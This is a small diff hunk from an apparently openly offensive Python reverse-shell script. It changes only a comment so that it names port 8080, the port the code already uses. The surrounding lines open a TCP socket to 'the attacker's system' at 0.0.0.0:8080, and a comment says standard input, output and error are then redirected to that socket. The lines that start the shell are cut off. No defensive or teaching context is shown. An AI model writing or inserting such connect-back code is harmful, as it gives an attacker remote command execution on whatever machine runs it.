@@ -5,7 +5,7 @@ import os
 # Create a socket object
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Connect to the attacker's system on IP address 0.0.0.0 and port 7777
+# Connect to the attacker's system on IP address 0.0.0.0 and port 8080
 s.connect(("0.0.0.0", 8080))
 
 # Duplicate file descriptors to redirect standard input, output, and error to the socket
